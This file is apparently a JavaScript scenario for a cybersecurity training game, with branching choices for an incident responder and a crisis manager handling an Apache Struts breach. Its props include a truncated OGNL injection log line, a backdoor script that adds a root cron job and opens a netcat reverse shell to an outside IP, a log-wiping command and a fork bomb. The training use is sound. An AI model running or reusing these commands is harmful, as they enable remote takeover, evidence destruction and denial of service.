// Operation Zero Day Meltdown
// Difficulty: Insane
// Theme: Corporate Network Breach via Zero-Day in Web Server

const OperationZeroDayMeltdown = {
    id: 'sc_zero_day',
    title: 'Operation Zero Day Meltdown',
    tagline: 'A zero-day exploit is live. The network is bleeding. The attacker is already inside.',
    difficulty: 'Intermediate',
    time: '45 Mins',
    xp: 2500,
    thumbnail: '/images/hero-arbiter.png', // Using existing asset
    description: 'CRITICAL ALERT: An unknown adversary has compromised the internal payment gateway using a suspected zero-day vulnerability in our Apache Struts implementation. Data exfiltration detected on port 443 via encrypted tunnel. Immediate containment required.',
    learningObjectives: [
        'Analyze raw server logs to identify zero-day signatures.',
        'Execute emergency containment while preserving forensic evidence.',
        'Mitigate lateral movement within a compromised subnet.',
        'Perform root cause analysis under high pressure.',
        'Recover from partial failures without losing the war.'
    ],
    completed: false,
    totalSteps: 7, // Increased from 5
    roles: {
        analyst: {
            id: 'analyst',
            title: 'Lead Security Incident Responder',
            type: 'Technical', // NEW: For the badge
            avatar: '/images/hero-arbiter.png',
            shortDescription: 'The hands-on technical defender. You fight the code, not the people.', // NEW: Short text
            fullDescription: 'You are the last line of defense. The SOC is overwhelmed. You have full authority to burn the network to save the data.', // RENAMED
            focus: 'Packet Analysis, Firewall Rules, System Forensics', // NEW: What to expect
            description: 'You are the last line of defense. The SOC is overwhelmed. You have full authority to burn the network to save the data.', // Keep for backward compat if needed temporarily, but we will switch to shortDescription in UI
            startNode: 'node_1_alert',
            nodes: {
                // STAGE 1: DETECTION
                node_1_alert: {
                    id: 'node_1_alert',
                    text: 'You see unusual POST requests with heavily encoded payloads followed by a CONNECT tunnel. What is your immediate action?',
                    data: [
                        {
                            label: 'System Alert',
                            type: 'alert',
                            content: `
=== SYSTEM ALERT: SEVERITY CRITICAL ===
timestamp: 2024-10-24 14:02:11 UTC
source: IDS_Gateway_01
event: OUTBOUND_TRAFFIC_SPIKE
details: +4000% baseline traffic on port 443 to IP 192.0.2.88 (Uncategorized)
                            `
                        },
                        {
                            label: 'Apache Access Logs',
                            type: 'log',
                            content: `
// APACHE ACCESS LOGS //
192.168.1.105 - - [24/Oct/2024:14:01:55] "GET /payment/process HTTP/1.1" 200 1542
192.168.1.105 - - [24/Oct/2024:14:02:05] "POST /payment/debug?cmd=%28%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29..." 200 8942 
192.168.1.105 - - [24/Oct/2024:14:02:06] "CONNECT 192.0.2.88:443 HTTP/1.1" 200 -
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Immediate Containment: Sever the external connection to 192.0.2.88 at the firewall.',
                            next: 'node_2_containment',
                            points: 50,
                            judge: 'Good. Stopping the bleeding is priority #1. However, you might have alerted the attacker that you are watching.'
                        },
                        {
                            text: 'Deep Caps: Start a full packet capture (PCAP) on the web server to analyze the payload before acting.',
                            next: 'node_2_too_slow',
                            points: 10,
                            judge: 'Too slow! While you were setting up Wireshark, the attacker exfiltrated another 50MB of customer hashes. Action beats analysis in a crisis.'
                        },
                        {
                            text: 'Reboot Server: Issue an immediate restart command to the payment gateway server.',
                            next: 'node_1b_reboot_recovery', // RECOVERY PATH
                            points: -20, // Not -50 anymore
                            judge: 'Risky! You effectively stopped the current session, but you also flushed the RAM artifacts. The attacker will reconnect in seconds.'
                        }
                    ]
                },

                // RECOVERY PATH: REBOOT
                node_1b_reboot_recovery: {
                    id: 'node_1b_reboot_recovery',
                    text: 'The server has rebooted. The active shell is gone, but the vulnerability remains. You are flying blind without RAM logs to guide you. The firewall shows the attacker trying to reconnect right now.',
                    data: [
                        {
                            label: 'Firewall Live Stream',
                            type: 'alert',
                            content: `
[DROP] 192.0.2.88:54322 -> 192.168.1.105:443 (SYN)
[DROP] 192.0.2.88:54322 -> 192.168.1.105:443 (SYN)
[ACCEPT] 192.0.2.88:54322 -> 192.168.1.105:8080 (New Port Discovered)
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Blind Block: Block ALL traffic from the attacker\'s subnet (192.0.2.0/24).',
                            next: 'node_2_containment',
                            points: 40,
                            judge: 'Aggressive but effective. You blocked the new port attempt. You are back in the fight.'
                        },
                        {
                            text: 'Wait & Better Logs: Enable verbose logging to see what they do next.',
                            next: 'node_2_too_slow',
                            points: -30,
                            judge: 'You let them walk right back in. They re-established persistence while you were configuring rsyslog.'
                        }
                    ]
                },

                // STAGE 2: CONTAINMENT
                node_2_containment: {
                    id: 'node_2_containment',
                    text: 'The attacker has realized the external line is cut. They are pivoting laterally to the database! The payload suggests a Remote Code Execution (RCE). How do you stop the lateral movement?',
                    data: [
                        {
                            label: 'Firewall Logs',
                            type: 'success',
                            content: `
// FIREWALL LOGS //
[SUCCESS] DENY 192.168.1.105 -> 192.0.2.88:443
[ALERT] New connection attempt detected: 192.168.1.105 -> 10.0.5.2 (Internal Database) on port 3306
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Isolate VLAN: Quarantine the entire Web Server subnet (VLAN 10) from the Database',
                            next: 'node_3_decryption', // NEW STAGE
                            points: 60,
                            judge: 'Excellent tactical decision. Segmentation halted the pivot. The attacker is trapped on the web server with no way out.'
                        },
                        {
                            text: 'Kill Process: SSH in and `kill -9` the suspicious "kworker_u8" process.',
                            next: 'node_3_persistence',
                            points: 20,
                            judge: 'Risky. The process respawned immediately with a different PID. It is likely a rootkit service managed by systemd.'
                        },
                        {
                            text: 'Patch Server: Attempt to apply the latest Apache security patches immediately.',
                            next: 'node_2b_patch_fail', // RECOVERY PATH
                            points: 0,
                            judge: 'You cannot patch a live compromised system! The update script failed.'
                        }
                    ]
                },

                // RECOVERY PATH: PATCH FAILURE
                node_2b_patch_fail: {
                    id: 'node_2b_patch_fail',
                    text: 'The patch failed! The attacker has locked the `yum` lock file and is actively mocking you in the terminal. They are trying to dump the `/etc/shadow` file while you are distracted.',
                    data: [
                        {
                            label: 'Terminal Warning',
                            type: 'alert',
                            content: `
root@web01:~# yum update
Another app is currently holding the yum lock; waiting for it to exit...
  The other application is: bash
    Memory : 45 M RSS ( 1.2 GB VSZ)
    Started: Thu Oct 24 14:05:00 2024 - 00:04 ago
    State  : Sleeping, pid: 4421

// INTRUDER MSG //
"Nice try admin. Did you really think I wouldn't lock the package manager?"
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Emergency Hardware Shutdown: Pull the virtual power cable (vSphere Force Off).',
                            next: 'node_3_decryption', // Leads to success but with damage
                            points: 40,
                            judge: 'Drastic, but it worked. You killed the machine instantly. No shadow file for them. But now we have to analyze a cold disk.'
                        },
                        {
                            text: 'Fight Back: Try to `kill -9` their bash PID.',
                            next: 'node_failure_rootkit',
                            points: -50,
                            judge: 'They had a trap logic bomb. Killing the PID wiped the logs. You lost.'
                        }
                    ]
                },

                node_2_too_slow: {
                    id: 'node_2_too_slow',
                    text: 'The attacker moved faster than you. They are now in the database subnet.',
                    data: [
                        {
                            label: 'SIEM Alert',
                            type: 'alert',
                            content: `
By the time your PCAP started, the connection dropped. 
// SIEM ALERT //
"Database_01" reports unauthorized SELECT query on table "users_credit_cards".
                            `
                        },
                        {
                            label: 'Chat Message',
                            type: 'info',
                            content: `
DBadmin: "Hey, why is the web server dumping 5GB of data from the Customers table? Should I stop it?"
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Emergency Shutdown: Pull the power on the Database Server.',
                            next: 'node_failure_db_corrupt',
                            points: -20,
                            judge: 'You stopped the theft, but the hard shutdown corrupted the RAID array.'
                        },
                        {
                            text: 'Poison Pill: Inject fake records into the query stream to dilute the stolen data.',
                            next: 'node_3_decryption',
                            points: 40,
                            judge: 'Creative! You flooded their download with junk data. They got some real data, but mostly garbage.'
                        },
                        {
                            text: 'Isolate VLAN: Block all traffic between Web Subnet and DB Subnet.',
                            next: 'node_3_decryption',
                            points: 30,
                            judge: 'Late, but better than never. They got a chunk of data, but you cut the stream.'
                        }
                    ]
                },

                // NEW STAGE 2.5: DECRYPTION & HUNT
                node_3_decryption: {
                    id: 'node_3_decryption',
                    text: 'Stage 2 Complete. The bleeding has stopped. However, we found an encrypted file `payload.enc` left in `/tmp`. We need to know what they stole or what tools they left behind. How do you approach the decryption?',
                    data: [
                        {
                            label: 'File Artifact',
                            type: 'code',
                            content: `
File: /tmp/payload.enc
Size: 4.2 MB
Header: 53 61 6c 74 65 64 5f 5f (Salted__)
Entropy: 7.99 (High - Likely AES-256)
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Memory Dump Analysis: Analyze the RAM dump for OpenSSL artifacts and keys.',
                            next: 'node_3_analysis', // Connects back to original flow
                            points: 100,
                            judge: 'Genius. You found the AES key in the memory heap of the Apache process. We can decrypt the file instantly.'
                        },
                        {
                            text: 'Brute Force: Run hashcat on the file.',
                            next: 'node_4_victory_partial',
                            points: -10,
                            judge: 'It will take 4,000 years to crack AES-256. We don\'t have that kind of time.'
                        },
                        {
                            text: 'Reverse Engineer: Decompile the malware dropper to find hardcoded keys.',
                            next: 'node_3_analysis',
                            points: 70,
                            judge: 'Solid approach. You found a static key in the binary. It worked!'
                        }
                    ]
                },

                // STAGE 3: ERADICATION (Renamed/Moved from old node_3_analysis)
                node_3_analysis: {
                    id: 'node_3_analysis',
                    text: 'Decryption successful. The file contained a list of C2 servers and a persistence backdoor script. We are ready to eradicate the threat completely.',
                    data: [
                        {
                            label: 'Decrypted Payload',
                            type: 'code',
                            content: `
#!/bin/bash
# BACKDOOR
echo "*/5 * * * * root /usr/bin/python3 /tmp/.kernel_update.py" >> /etc/crontab
nc -e /bin/bash 45.33.22.11 4444
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Nuke it: Snapshot for evidence, then wipe and revert to Golden Image.',
                            next: 'node_4_victory',
                            points: 100,
                            judge: 'The only safe way to clean a rootkit. Nuke it from orbit.'
                        },
                        {
                            text: 'Surgical Clean: Remove the crontab entry and delete the python script.',
                            next: 'node_failure_rootkit',
                            points: 10,
                            judge: 'You missed the hidden service file in /etc/systemd/system/. They are still in.'
                        }
                    ]
                },

                node_3_persistence: {
                    id: 'node_3_persistence',
                    text: 'The attacker realizes you are fighting back. They just triggered a fork bomb to crash the server and hide their tracks.',
                    data: [
                        {
                            label: 'Shell Activity',
                            type: 'alert',
                            content: `
// SHELL //
root@web01:~# rm -rf /var/log/*
root@web01:~# :(){ :|:& };:
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Revert to Snapshot: Restore the VM to the state from 1 hour ago.',
                            next: 'node_4_victory_partial',
                            points: 70,
                            judge: 'Good recovery. We lost 1 hour of transaction data, but the network is clean.'
                        },
                        {
                            text: 'Hard Reboot',
                            next: 'node_failure_ram',
                            points: -10,
                            judge: 'The system is stuck in a boot loop. The damage was already done to the bootloader.'
                        }
                    ]
                },

                // ENDINGS
                node_4_victory: {
                    type: 'ending',
                    text: 'MISSION SUCCESS. You identified the Zero-Day, contained the breach, recovered the encryption keys from RAM, and neutralized the threat. The CISO is impressed.',
                    score: 100,
                    stars: 3
                },
                node_4_victory_partial: {
                    type: 'ending',
                    text: 'MISSION PASSED. You survived the breach, but reaction time was slow or data was lost. The organization survives, but the cleanup will be expensive.',
                    score: 70,
                    stars: 2
                },
                node_failure_ram: {
                    type: 'ending',
                    text: 'MISSION FAILED. Rebooting destroyed evidence and failed to stop the attack. The attacker re-established persistence immediately.',
                    score: 0,
                    stars: 0
                },
                node_failure_db_corrupt: {
                    type: 'ending',
                    text: 'MISSION FAILED. You caused more financial damage than the hacker by corrupting the main database.',
                    score: 0,
                    stars: 0
                },
                node_failure_negotiate: {
                    type: 'ending',
                    text: 'MISSION FAILED. Professionalism is required. You engaged the attacker and lost.',
                    score: 0,
                    stars: 0
                },
                node_failure_rootkit: {
                    type: 'ending',
                    text: 'MISSION FAILED. False sense of security. The rootkit remained active. 2 weeks later, specific ransomware encrypted the entire SAN.',
                    score: 10,
                    stars: 1
                },
                node_failure_risk: {
                    type: 'ending',
                    text: 'MISSION FAILED. Prioritize business continuity and containment over curiosity.',
                    score: 0,
                    stars: 0
                }
            }
        },
        manager: {
            id: 'manager',
            title: 'Crisis Response Director',
            type: 'Management', // NEW
            avatar: '/images/hero-strategist.png',
            shortDescription: 'The face of the company. You fight the panic, the press, and the board.', // NEW
            fullDescription: 'You handle the fallout. The press is calling, the CEO is panicking, and the legal team is screaming. Control the narrative. Save the stock price.', // RENAMED
            focus: 'Public Relations, Legal Compliance, Risk Assessment', // NEW
            description: 'You handle the fallout. The press is calling, the CEO is panicking, and the legal team is screaming. Control the narrative. Save the stock price.',
            startNode: 'node_m_1_alert',
            nodes: {
                // STAGE 1: INITIAL RESPONSE
                node_m_1_alert: {
                    id: 'node_m_1_alert',
                    text: 'The CISO just briefed you: We have a confirmed active breach. Customer credit card data is leaking. The tech team is attempting to contain it, but rumors are already spreading on Twitter. Journalists are calling the switchboard. What is your immediate communication strategy?',
                    data: [
                        {
                            label: 'Briefing Doc',
                            type: 'info',
                            content: `
=== EXECUTIVE BRIEFING ===
Status: CONFIRMED BREACH
Data: Customer PII + Credit Cards
Impact: High
Time Detected: 14:02 UTC
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Silence: Issue a strict "No Comment" policy and wait for confirmed facts.',
                            next: 'node_m_2_leak',
                            points: 30,
                            judge: 'Safe, but dangerous. The vacuum of information allowed rumors to become facts. A tech blog just published that "millions" are affected.'
                        },
                        {
                            text: 'Transparency: Issue a holding statement acknowledging "unusual activity" and promising updates.',
                            next: 'node_m_2_statement',
                            points: 60,
                            judge: 'Good balance. You controlled the narrative early without admitting liability before we know the scope.'
                        },
                        {
                            text: 'Denial: Deny any breach occurred until we are 100% sure.',
                            next: 'node_failure_manager_coverup',
                            points: -50,
                            judge: 'Terrible! Evidence was just pasted to Pastebin. You look like a liar and a cover-up artist. Stock price crashes 15%.'
                        }
                    ]
                },

                // STAGE 2: STAKEHOLDER MANAGEMENT
                node_m_2_statement: {
                    id: 'node_m_2_statement',
                    text: 'Your statement bought some time. But the Board is demanding answers. The Legal Counsel advises shutting down the entire platform to stop liability. The CTO argues that keeping the platform up (but isolated) is critical for revenue. Who do you side with?',
                    data: [], // No specific data for this step
                    options: [
                        {
                            text: 'Side with Legal: Full platform shutdown immediately.',
                            next: 'node_m_3_compliance',
                            points: 50,
                            judge: 'Conservative choice. Revenue hits zero for the day, but you avoided a negligence lawsuit. The Board is unhappy but understands.'
                        },
                        {
                            text: 'Side with Technical: Keep non-affected systems running.',
                            next: 'node_m_3_risk',
                            points: 50,
                            judge: 'Calculated risk. The business continues, but you are sweating bullets hoping the hackers don\'t pivot to the live systems.'
                        },
                        {
                            text: 'Ignore Both: Hold a press conference to reassure investors.',
                            next: 'node_failure_manager_press',
                            points: -20,
                            judge: 'You walked into a shark tank without armor. A reporter asked a technical question you couldn\'t answer. You looked incompetent.'
                        }
                    ]
                },

                node_m_2_leak: {
                    id: 'node_m_2_leak',
                    text: 'The silence backfired. A whistleblower in IT posted logs to Reddit. The hashtag #ZeroDayMeltdown is trending. The CEO is demanding you "Fix this NOW". How do you kill the story?',
                    data: [
                        {
                            label: 'Social Media Feed',
                            type: 'alert',
                            content: `
@SecurityInsider: "Huge leak at GlobalCorp confirmed. Logs show full CC details. #ZeroDayMeltdown"
@Hacktivist01: "GlobalCorp lying to customers. Here is the proof: [Link]"
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Deflect: Blame a sophisticated "Nation State" actor.',
                            next: 'node_m_3_compliance',
                            points: 40,
                            judge: 'It worked... partly. The media loves a spy story. But the FBI is now involved and will find out it was just a script kiddie.'
                        },
                        {
                            text: 'Attack: Threaten legal action against the whistleblower.',
                            next: 'node_failure_manager_streisand',
                            points: -100,
                            judge: 'Streisand Effect triggered. Now everyone is sharing the leaks purely out of spite. You turned a breach into a war with the internet.'
                        },
                        {
                            text: 'Pivot: Announce a new "Industry Leading" security initiative (that doesn\'t exist yet).',
                            next: 'node_m_3_risk',
                            points: 10,
                            judge: 'Weak. Journalists see right through the vaporware. But it filled the news cycle for an hour.'
                        }
                    ]
                },

                // STAGE 3: RESOLUTION
                node_m_3_compliance: {
                    id: 'node_m_3_compliance',
                    text: 'The breach is contained (technically). Now for the regulators. GDPR requires notification within 72 hours. We have 500 confirmed leaked records, but it *could* be 5 million. What do you report to the Data Protection Officer?',
                    data: [],
                    options: [
                        {
                            text: 'Full Disclosure: Report the potential maximum (5 million) to be safe.',
                            next: 'node_m_4_victory_safe',
                            points: 80,
                            judge: 'Honesty pays. The fine will be lower because of your cooperation. Trust is maintained.'
                        },
                        {
                            text: 'Minimum Disclosure: Report only the 500 confirmed records.',
                            next: 'node_failure_manager_regs',
                            points: -40,
                            judge: 'Dangerous gamble. Next week forensics found 50,000 more. Now you are being fined for "Misleading Authorities".'
                        },
                        {
                            text: 'Delay: File an extension request.',
                            next: 'node_m_4_victory_partial',
                            points: 30,
                            judge: 'Generic corporate maneuver. It works, but customers feel like you are hiding something.'
                        }
                    ]
                },

                node_m_3_risk: {
                    id: 'node_m_3_risk',
                    text: 'The system stayed up. We made money, but the attackers might still be lurking. A ransomware group has emailed demanding 50 BTC ($3M) to not release the customer database. The policy is "No Negotiations". But the database has VIP clients.',
                    data: [
                        {
                            label: 'Ransom Email',
                            type: 'alert',
                            content: `
From: silent_vector@protonmail.com
Subject: We have your data.

Pay 50 BTC to [Wallet Address] within 24 hours or we dump the VIP table.
Tick tock.
                            `
                        }
                    ],
                    options: [
                        {
                            text: 'Pay it: Use the discretionary fund. Keep it quiet.',
                            next: 'node_failure_manager_pay',
                            points: -100,
                            judge: 'You paid the ransom. They released the data anyway. Now you have no money AND no data. You are fired.'
                        },
                        {
                            text: 'Ignore: Block their email. Prepare the apology letters.',
                            next: 'node_m_4_victory_hard',
                            points: 90,
                            judge: 'Tough love. The data leaked, but you stood your ground. The market respects strength. Stock recovers.'
                        },
                        {
                            text: 'Stall: Ask for "Proof of Life" (sample data) to buy time for the FBI.',
                            next: 'node_m_4_victory_partial',
                            points: 70,
                            judge: 'Smart. The delay allows the technical team to find the backdoors. Good coordination.'
                        }
                    ]
                },

                // ENDINGS
                node_m_4_victory_safe: {
                    type: 'ending',
                    text: 'MISSION SUCCESS. You navigated a PR nightmare with integrity. The company took a hit, but trust is intact. The Board commends your transparency.',
                    score: 100,
                    stars: 3
                },
                node_m_4_victory_hard: {
                    type: 'ending',
                    text: 'MISSION SUCCESS. You played hardball. The press hated you, but the shareholders loved you. The company survived the storm.',
                    score: 90,
                    stars: 3
                },
                node_m_4_victory_partial: {
                    type: 'ending',
                    text: 'MISSION PASSED. You survived, but it was messy. The brand damage will take years to repair.',
                    score: 60,
                    stars: 2
                },
                node_failure_manager_coverup: {
                    type: 'ending',
                    text: 'MISSION FAILED. Cover-ups never work in the digital age. You are facing criminal charges for obstruction.',
                    score: 0,
                    stars: 0
                },
                node_failure_manager_press: {
                    type: 'ending',
                    text: 'MISSION FAILED. You lost control of the narrative. The CEO took over and fired you on live TV.',
                    score: 0,
                    stars: 0
                },
                node_failure_manager_streisand: {
                    type: 'ending',
                    text: 'MISSION FAILED. You attacked the community and the community fought back. The company is being DDoSed into oblivion.',
                    score: 0,
                    stars: 0
                },
                node_failure_manager_regs: {
                    type: 'ending',
                    text: 'MISSION FAILED. Regulatory fines have bankrupted the department. You cannot lie to the government.',
                    score: 0,
                    stars: 0
                },
                node_failure_manager_pay: {
                    type: 'ending',
                    text: 'MISSION FAILED. Never pay the ransom. You funded their next attack and got nothing in return.',
                    score: 0,
                    stars: 0
                }
            }
        }
    }
};

export default OperationZeroDayMeltdown;
